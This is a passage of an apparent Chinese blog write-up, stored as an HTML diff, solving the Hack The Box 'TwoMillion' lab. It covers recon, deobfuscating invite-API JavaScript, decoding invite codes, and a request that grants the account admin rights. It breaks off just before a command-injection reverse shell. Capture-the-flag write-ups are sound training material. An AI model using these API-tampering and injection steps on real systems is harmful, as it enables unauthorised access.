@@ -1,0 +1,836 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：js解密、API参数模糊测试、API接口命令注入、环境变量和用户组敏感信息泄露、CVE-2023-0386、CVE-2023-4911">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TwoMillion-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/02/TwoMillion-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：js解密、API参数模糊测试、API接口命令注入、环境变量和用户组敏感信息泄露、CVE-2023-0386、CVE-2023-4911">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/8.png">
+<meta property="article:published_time" content="2023-12-02T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-01T16:22:07.153Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/TwoMillion-htb-writeup/1.png">
+  
+  
+  
+  <title>TwoMillion-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TwoMillion-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-02 23:50" pubdate>
+          2023年12月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          130 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TwoMillion-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：js解密、API参数模糊测试、API接口命令注入、环境变量和用户组敏感信息泄露、CVE-2023-0386、CVE-2023-4911</p>
+<span id="more"></span>  
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://mark0.pw/2023/06/10/HackTheBox-TwoMillion-Writeup/">https://mark0.pw/2023/06/10/HackTheBox-TwoMillion-Writeup/</a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://jackx8x7x.gitbook.io/security-stuff/hackthebox/linux/twomillion">https://jackx8x7x.gitbook.io/security-stuff/hackthebox/linux/twomillion</a></p>
+<p>参考链接：</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取靶机地址：<strong>10.10.11.221</strong></p>
+<p>2、测试是否能正常链接靶机地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ping 10.10.11.221 -c 4<br>PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.<br>64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=373 ms<br>64 bytes from 10.10.11.221: icmp_seq=2 ttl=63 time=366 ms<br>64 bytes from 10.10.11.221: icmp_seq=3 ttl=63 time=807 ms<br>64 bytes from 10.10.11.221: icmp_seq=4 ttl=63 time=368 ms<br><br>--- 10.10.11.221 ping statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3011ms<br>rtt min/avg/max/mdev = 366.021/478.754/807.258/189.680 ms<br></code></pre></td></tr></table></figure>
+
+<p>3、常规nmap探测开放哪些端口服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sC -sV -p- 10.10.11.221 -oN 10.10.11.221.txt --min-rate 2000<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-30 22:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.221<br>Host is up (0.30s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Did not follow redirect to http://2million.htb/<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 67.79 seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、我们在探测中发现了 2million.htb 域名信息，按照以往打HTB的经验，我们需要把该域名和靶机IP在本机上做个hosts绑定。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.11.221 2million.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.11.221 2million.htb<br></code></pre></td></tr></table></figure>
+
+<p>5、然后我们访问80端口看看首页是什么</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>6、通过查看首页，我们发现这是旧版本的黑客盒子的网站，通过摸索，大概知道了这个好像是让进行注册个平台账号。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、通过查看网站源代码，我们看到如下的代码：</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、我们使用chatgpt解释一下看看</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown">这段 JavaScript 代码是使用 jQuery 库进行 AJAX 请求的一部分。让我为你解释一下：<br><br><span class="hljs-bullet">1.</span> <span class="hljs-code">`$.ajax(&#123; ... &#125;)`</span>: 这是 jQuery 提供的一个函数，用于执行 AJAX 请求。<br><br><span class="hljs-bullet">2.</span> <span class="hljs-code">`type: &quot;POST&quot;`</span>: 指定了 HTTP 请求的类型，这里是一个 POST 请求。<br><br><span class="hljs-bullet">3.</span> <span class="hljs-code">`dataType: &quot;json&quot;`</span>: 指定了期望从服务器返回的数据类型，这里是 JSON。<br><br><span class="hljs-bullet">4.</span> <span class="hljs-code">`data: formData`</span>: 发送到服务器的数据，<span class="hljs-code">`formData`</span> 是在代码的其他地方定义的一个变量。<br><br><span class="hljs-bullet">5.</span> <span class="hljs-code">`url: &#x27;/api/v1/invite/verify&#x27;`</span>: 指定了服务器端接收请求的 URL。<br><br><span class="hljs-bullet">6.</span> <span class="hljs-code">`success: function(response) &#123; ... &#125;`</span>: 定义了当请求成功完成时执行的函数。<span class="hljs-code">`response`</span> 是服务器返回的数据。<br><br>   a. 检查了 <span class="hljs-code">`response`</span> 中的一些属性来确定请求是否成功和返回的数据是否符合预期。<br><br>   b. 如果符合条件，将邀请码（<span class="hljs-code">`code`</span>）存储在本地存储（localStorage）中，并将页面重定向到 &#x27;/register&#x27;。<br><br>   c. 如果条件不符合，显示一个警告框，表示邀请码无效。<br><br><span class="hljs-bullet">7.</span> <span class="hljs-code">`error: function(response) &#123; ... &#125;`</span>: 定义了当请求失败时执行的函数。显示一个警告框，表示发生了错误，提示用户重试。<br><br>这段代码的主要目的是向服务器端发送一个 POST 请求，验证邀请码。如果验证通过，将邀请码存储在本地存储中，并将用户重定向到注册页面；否则，显示一个警告框提示用户邀请码无效。<br></code></pre></td></tr></table></figure>
+
+<p>9、再次翻看网站源代码我发现了相关的js文件</p>
+<p><code>view-source:http://2million.htb/js/inviteapi.min.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p,a,c,k,e,d</span>)&#123;e=<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(c--)&#123;d[c.<span class="hljs-title function_">toString</span>(a)]=k[c]||c.<span class="hljs-title function_">toString</span>(a)&#125;k=[<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> d[e]&#125;];e=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span>(c--)&#123;<span class="hljs-keyword">if</span>(k[c])&#123;p=p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span>+<span class="hljs-title function_">e</span>(c)+<span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),k[c])&#125;&#125;<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0</span>,&#123;&#125;))<br></code></pre></td></tr></table></figure>
+
+<p>10、代码是好像混淆过的，看首行是eval，我们把这个参数修改为alert并在console命令行里运行下看看</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyInviteCode</span>(<span class="hljs-params">code</span>)&#123;<span class="hljs-keyword">var</span> formData=&#123;<span class="hljs-string">&quot;code&quot;</span>:code&#125;;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">type</span>:<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-attr">dataType</span>:<span class="hljs-string">&quot;json&quot;</span>,<span class="hljs-attr">data</span>:formData,<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/api/v1/invite/verify&#x27;</span>,<span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)&#125;,<span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)&#125;&#125;)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeInviteCode</span>(<span class="hljs-params"></span>)&#123;$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">type</span>:<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-attr">dataType</span>:<span class="hljs-string">&quot;json&quot;</span>,<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,<span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)&#125;,<span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response)&#125;&#125;)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>11、可以看出来这个混淆的函数是有2个函数的，分别是verifyInviteCode()和makeInviteCode()</p>
+<p>12、然后我们根据函数名，把makeInviteCode()函数在网站的console命令行里运行下看看。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Object</span> &#123; <span class="hljs-number">0</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">success</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">data</span>: &#123;…&#125;, <span class="hljs-attr">hint</span>: <span class="hljs-string">&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span> &#125;<br><span class="hljs-number">0</span>: <span class="hljs-number">200</span><br><span class="hljs-attr">data</span>: <span class="hljs-title class_">Object</span> &#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;</span>, <span class="hljs-attr">enctype</span>: <span class="hljs-string">&quot;ROT13&quot;</span> &#125;<br><span class="hljs-attr">data</span>: <span class="hljs-string">&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;</span><br><span class="hljs-attr">enctype</span>: <span class="hljs-string">&quot;ROT13&quot;</span><br>&lt;prototype&gt;: <span class="hljs-title class_">Object</span> &#123; … &#125;<br><span class="hljs-attr">hint</span>: <span class="hljs-string">&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><br><span class="hljs-attr">success</span>: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>13、根据提示，我们知道上述的数据应该使用了ROT13进行了加密，我们使用在线的网站解密下看看是什么内容</p>
+<p><code>https://m.jisuan.mobi/WKE.html</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">In order to generate the invite code, make a POST request to /api/v1/invite/generate<br></code></pre></td></tr></table></figure>
+
+<p>14、可以看出是向这个 &#x2F;api&#x2F;v1&#x2F;invite&#x2F;generate 路径发送个POST包就可以获取到邀请码了，这里使用curl尝试下，最近刚学的用法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ curl -X POST -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&#x27;&#123;&quot;key1&quot;:&quot;value1&quot;&#125;&#x27;</span> http://2million.htb/api/v1/invite/generate<br>&#123;<span class="hljs-string">&quot;0&quot;</span>:200,<span class="hljs-string">&quot;success&quot;</span>:1,<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;SExCUDUtOEdVMTMtM05VNkstQ01LQTk=&quot;</span>,<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;encoded&quot;</span>&#125;&#125;   <br></code></pre></td></tr></table></figure>
+
+<p>15、还需要对上述code进行解码一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> SExCUDUtOEdVMTMtM05VNkstQ01LQTk= | <span class="hljs-built_in">base64</span> -d              <br>HLBP5-8GU13-3NU6K-CMKA9<br></code></pre></td></tr></table></figure>
+
+<p>16、至此，邀请码正确，我们进入到注册页面了。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、注册成功后，成功进入到了后台界面。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>18、在目录检索操作中也发现了该接口目录 &#x2F;api&#x2F;v1 地址，同时通过查看引导模式，我们大概知道了，应该是让通过利用接口的形式进行权限变更。</p>
+<p><code>当用户单击“连接包”时，页面使用的端点路径是什么？</code></p>
+<p><code>/api/v1/user/vpn/generate</code></p>
+<p><code>下面有多少个 API 端点/api/v1/admin？</code></p>
+<p><code>3</code></p>
+<p><code>哪个 API 端点可以将用户帐户更改为管理员帐户？</code></p>
+<p><code>/api/v1/admin/settings/update</code></p>
+<p>19、通过不断的模糊测试，成功将当前账号修改为管理员账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">PUT /api/v1/admin/settings/update HTTP/1.1<br>Host: 2million.htb<br>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate <br>Connection: close<br>Cookie: PHPSESSID=2h5lsb2hbttlmrqoebafiv7isr<br>Upgrade-Insecure-Requests: 1<br>Content-Type:application/json<br>Content-Length: 44<br><br>&#123;<br><span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;shiyan@qq.com&quot;</span>,<br><span class="hljs-string">&quot;is_admin&quot;</span>:1<br>&#125;<br><br>HTTP/1.1 200 OK<br>Server: nginx<br>Date: Thu, 30 Nov 2023 15:54:25 GMT<br>Content-Type: application/json<br>Connection: close<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 42<br><br>&#123;<span class="hljs-string">&quot;id&quot;</span>:14,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;shiyan&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:1&#125;<br></code></pre></td></tr></table></figure>
+
+<p>20、根据引导提示，应该是哪个API接口存在命令注入漏洞，那我们继续开始尝试其他的接口</p>
+<p><code>哪个 API 端点存在命令注入漏洞？</code></p>
+<p><code>/api/v1/admin/vpn/generate</code></p>
+<p><code>PHP 应用程序中通常使用什么文件来存储环境变量值？</code></p>
+<p><code>.env</code></p>
+<p>21、通过模糊测试应该就是这个接口存在命令注入，但是我这里各种尝试都不成功，只能看看其他人的方法进行命令注入，反弹shell了。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
